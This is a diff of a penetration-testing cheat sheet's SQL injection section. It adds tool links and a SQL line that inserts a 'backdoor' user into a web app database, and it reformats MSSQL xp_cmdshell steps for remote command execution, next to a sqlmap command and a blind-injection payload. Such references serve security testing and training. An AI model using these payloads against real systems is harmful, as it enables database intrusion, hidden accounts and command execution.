@@ -1165,10 +1165,11 @@ You can find it here: [projectdiscovery/nuclei](https://github.com/projectdiscov
 ### <ins>SQL injection</ins>
 
 **Tools**
-- [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+- [SQL injection cheat sheet  | PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 - [SQL Injection cheat sheets | pentestmonkey](https://pentestmonkey.net/category/cheat-sheet/sql-injection)
+- [sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)
 
-[**sqlmap**](https://sqlmap.org/)
+**sqlmap**
 ```
  > SQLMap: sqlmap -u https://vulnerable/index.php?id=1
                   --tables (to see db)
@@ -1190,26 +1191,30 @@ You can find it here: [projectdiscovery/nuclei](https://github.com/projectdiscov
   0'or(now()=sysdate()&&SLEEP(1))or'Z
   ```
 
-**RCE**
+**Insert a new user**
 ```SQL
-EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
-EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
-xp_cmdshell 'COMMAND';
+insert into webappdb.users(password, username) VALUES ("backdoor","backdoor");
 ```
 
-```SQL
-EXEC sp_configure 'allow updates', 0
-RECONFIGURE
-EXEC sp_configure 'show advanced options', 1
-GO
-RECONFIGURE
-GO
-EXEC sp_configure 'xp_cmdshell', 1
-GO
-RECONFIGURE
-GO
-xp_cmdshell 'COMMAND';
-```
+**RCE**
+- ```SQL
+  EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+  xp_cmdshell 'COMMAND';
+  ```
+- ```SQL
+  EXEC sp_configure 'allow updates', 0
+  RECONFIGURE
+  EXEC sp_configure 'show advanced options', 1
+  GO
+  RECONFIGURE
+  GO
+  EXEC sp_configure 'xp_cmdshell', 1
+  GO
+  RECONFIGURE
+  GO
+  xp_cmdshell 'COMMAND';
+  ```
 
 
 
